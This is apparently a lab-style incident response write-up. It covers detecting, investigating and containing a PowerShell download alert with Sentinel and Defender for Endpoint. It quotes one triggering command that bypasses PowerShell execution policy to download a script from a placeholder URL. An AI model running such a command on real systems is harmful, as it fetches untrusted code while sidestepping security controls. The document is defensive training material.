# Incident Response Guide: PowerShell Suspicious Web Request

## 1. Detection Strategy

Created a Sentinel Alert to identify usage of `Invoke-WebRequest` via PowerShell targeting known untrusted sources.
![image](https://github.com/user-attachments/assets/5c75b1ea-99ee-4c39-841d-c57266c15c8b)
![image](https://github.com/user-attachments/assets/0c1f29a3-2759-4d3e-aa2c-a3114ac486ae)


## 2. Incident Triggering
![image](https://github.com/user-attachments/assets/419f7558-1913-434e-a82d-21dd35a39c1b)

The following PowerShell commands were executed on `windows-target-1`:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri [script URL] -OutFile C:\programdata\[filename].ps1
```

## 3. Investigation Steps (NIST 800-61)
![image](https://github.com/user-attachments/assets/569eb120-946c-42ca-bc3a-d6b0624b6005)
![image](https://github.com/user-attachments/assets/eede6c41-18e1-47bd-bad9-8ec050bef19c)

- **Identification:** Alert from Microsoft Defender for Endpoint.
- **Analysis:** MDE and Sentinel queries confirmed script download and execution.
- **Validation:** Manual review and KQL queries cross-referenced script execution.

## 4. Containment, Eradication & Recovery
![image](https://github.com/user-attachments/assets/ade8a36d-2ec1-4ffa-bed7-1c503dc36dc5)

- Isolated `windows-target-1` via MDE.
- Performed malware scans (clean).
- System removed from isolation after confirmation.

## 5. Post-Incident Activities

- User awareness training conducted.
- Security policy improved (PowerShell restrictions deployed).
- Awareness training platform upgraded.

## 6. Cleanup Procedures

- Removed downloaded scripts.
- Reviewed related user/system activity logs.
- Refreshed endpoint policy baselines.
